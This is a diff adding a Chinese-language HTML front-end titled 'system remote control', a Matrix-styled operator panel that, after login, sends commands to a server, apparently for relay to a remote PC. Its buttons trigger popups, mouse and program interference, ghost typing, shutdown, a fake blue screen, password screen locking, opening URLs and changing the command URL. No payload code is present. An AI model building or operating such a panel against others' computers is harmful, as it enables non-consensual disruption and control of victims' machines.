@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统远程控制</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Russo+One&display=swap" rel="stylesheet">
+    <style>
+        html, body {
+            font-family: 'Orbitron', sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            width: 100%;
+            overflow-x: hidden;
+            overflow-y: auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            background-color: #000;
+            color: #00ff00;
+        }
+
+        #background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fc-ssl.duitang.com%2Fuploads%2Fitem%2F201506%2F15%2F20150615202653_BjCkn.thumb.1000_0.jpeg&refer=http%3A%2F%2Fc-ssl.duitang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1725678835&t=d3b44db6accd8a6f3b537a29f05460e7');
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: 0;
+            animation: fadeInOut 5s infinite; /* 增加动画周期时间为5秒 */
+        }
+
+        @keyframes fadeInOut {
+            0%, 100% {
+                opacity: 0.3; /* 更低的起始和结束透明度 */
+            }
+            50% {
+                opacity: 1; /* 更高的中间透明度 */
+            }
+        }
+
+        .glowing {
+            animation: glow 2s infinite alternate;
+        }
+
+        .pulsing {
+            animation: pulse 2s infinite alternate;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.6);
+            position: relative;
+            box-sizing: border-box;
+            z-index: 1; /* 确保容器在背景之上 */
+            overflow: hidden;
+        }
+
+        h1, h2 {
+            color: #00ff00;
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px #00ff00;
+        }
+
+        .section {
+            margin-bottom: 20px;
+        }
+
+        .buttons, .inputs {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .buttons button, .inputs button {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            background: linear-gradient(145deg, #001900, #003300);
+            color: #00ff00;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s, color 0.3s, box-shadow 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            box-sizing: border-box;
+            position: relative;
+            animation: pulse 2s infinite alternate;
+        }
+
+        .buttons button:hover, .inputs button:hover {
+            background: linear-gradient(145deg, #00ff00, #007700);
+            color: #003300;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
+            transform: scale(1.05);
+        }
+
+        .inputs input {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #00ff00;
+            font-size: 14px;
+            box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.5);
+            padding-left: 40px;
+            box-sizing: border-box;
+            position: relative;
+            animation: pulse 2s infinite alternate;
+        }
+
+        .inputs input::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 5px;
+            z-index: -1;
+            box-shadow: inset 0 0 15px rgba(0, 255, 0, 0.8);
+            animation: pulse 2s infinite alternate;
+        }
+
+        .tooltip {
+            display: none;
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 255, 0, 0.8);
+            color: #003300;
+            padding: 10px 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            text-align: center;
+            z-index: 1000;
+        }
+
+        #matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            opacity: 0.5;
+        }
+
+        .disabled-button {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix"></canvas>
+
+    <div id="background"></div>
+
+    <div id="login-container" class="container glowing">
+        <h1>登录</h1>
+        <div class="inputs">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="用户名">
+                <input type="password" id="password" placeholder="密码">
+                <button onclick="login()">登录</button>
+            </div>
+        </div>
+        <div id="login-tooltip" class="tooltip">登录失败，请重试！</div>
+    </div>
+
+    <div id="control-panel" class="container glowing" style="display: none;">
+        <div id="tooltip" class="tooltip">操作成功！</div>
+        <h1>系统远程控制</h1>
+
+        <div class="section">
+            <h2>系统操作</h2>
+            <div class="buttons">
+                <button onclick="sendCommand('随机弹窗')">随机弹窗</button> 
+                <button onclick="sendCommand('鼠标干扰')">鼠标干扰</button>
+                <button onclick="sendCommand('更改壁纸')">更改壁纸</button>
+                <button onclick="sendCommand('文字转化')">文本转换</button>
+                <button onclick="sendCommand('关闭程序')">关闭程序</button>
+                <button onclick="sendCommand('程序干扰')">程序干扰</button>
+                <button onclick="sendCommand('幽灵输入')">幽灵输入</button>
+                <button onclick="sendCommand('关机')">关机</button>
+                <button onclick="sendCommand('打开程序')">打开程序</button>
+                <button onclick="sendCommand('更换图标')">更换图标</button>
+                <button onclick="sendCommand('打开系统设置')">打开系统设置</button>
+                <button onclick="sendCommand('模拟蓝屏')">模拟蓝屏</button>
+                                <button onclick="sendCommand('键盘干扰')" class="disabled-button" disabled>键盘干扰（更新中）</button>
+                                <button onclick="sendCommand('更改图标位置')" class="disabled-button" disabled>更改图标位置（更新中）</button>
+                <button onclick="sendCommand('进程干扰')" class="disabled-button" disabled>进程干扰（更新中）</button>
+                <button onclick="sendCommand('鼠标点击延迟')" class="disabled-button" disabled>鼠标点击延迟（更新中）</button>
+                <button onclick="sendCommand('屏幕闪烁')" class="disabled-button" disabled>屏幕闪烁（更新中）</button>
+                <button onclick="sendCommand('循环断网')" class="disabled-button" disabled>循环断网（更新中）</button>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>自定义操作</h2>
+            <div class="inputs">
+                <div class="input-group">
+                    <input type="text" id="customMessage" placeholder="输入消息">
+                    <button onclick="sendCustomMessage()">发送消息</button>
+                </div>
+                <div class="input-group">
+                    <input type="text" id="peppaUrl" placeholder="输入 URL">
+                    <button onclick="openPeppaUrl()">打开浏览器</button>
+                </div>
+                <div class="input-group">
+                    <input type="text" id="updateUrl" placeholder="输入更新 URL">
+                    <button onclick="updateUrl()">更新命令</button>
+                </div>
+                <div class="input-group">
+                    <input type="text" id="lockScreenPassword" placeholder="输入锁屏密码">
+                    <button onclick="lockScreen()">锁屏</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // 初始化 Matrix 效果
+            const canvas = document.getElementById('matrix');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            const columns = canvas.width / 20;
+            const drops = Array.from({length: columns}).fill(0);
+
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#00ff00';
+                ctx.font = '15pt monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    const text = String.fromCharCode(Math.random() * 122);
+                    ctx.fillText(text, i * 20, drops[i] * 20);
+                    if (drops[i] * 20 > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            setInterval(drawMatrix, 33);
+
+            // Disable buttons with "更新中" text
+            document.querySelectorAll('.buttons button').forEach(button => {
+                if (button.innerText.includes('更新中')) {
+                    button.classList.add('disabled-button');
+                    button.disabled = true;
+                }
+            });
+        });
+
+        function showTooltip(message) {
+            const tooltip = document.getElementById('tooltip');
+            tooltip.innerText = message;
+            tooltip.style.display = 'block';
+            setTimeout(() => {
+                tooltip.style.display = 'none';
+            }, 3000);
+        }
+
+        async function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const response = await fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            });
+
+            const result = await response.json();
+
+            if (result.status === 'success') {
+                document.getElementById('login-container').style.display = 'none';
+                document.getElementById('control-panel').style.display = 'block';
+            } else {
+                const loginTooltip = document.getElementById('login-tooltip');
+                loginTooltip.innerText = result.message;
+                loginTooltip.style.display = 'block';
+                setTimeout(() => {
+                    loginTooltip.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        async function sendCommand(command) {
+            console.log(`Sending command: ${command}`); // 添加日志
+            try {
+                const response = await fetch('/send_command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ command: command }),
+                });
+                const data = await response.json();
+                console.log('Command sent:', data);
+                if (data.status === 'success') {
+                    showTooltip('命令执行成功');
+                } else {
+                    showTooltip('命令执行失败: ' + data.message);
+                }
+            } catch (error) {
+                console.error('Error sending command:', error);
+                showTooltip('命令发送失败');
+            }
+        }
+
+        // Example of a front-end function sending a command
+        function sendCustomMessage() {
+            const message = document.getElementById('customMessage').value;
+            if (message.trim() === '') {
+                alert('消息不能为空');
+                return;
+            }
+            fetch('/send_custom_message', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ message: message }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                showTooltip('消息发送成功');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showTooltip('消息发送失败');
+            });
+        }
+
+        function openPeppaUrl() {
+            const url = document.getElementById('peppaUrl').value;
+            sendCommand(`OPEN_BROWSER:${url}`);
+        }
+
+        function updateUrl() {
+            const url = document.getElementById('updateUrl').value;
+            sendCommand(`UPDATE_URL:${url}`);
+        }
+
+        function lockScreen() {
+            const password = document.getElementById('lockScreenPassword').value;
+
+            fetch('/lock_screen', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "success") {
+                    alert("锁屏命令发送成功");
+                } else {
+                    alert("锁屏命令发送失败: " + data.message);
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
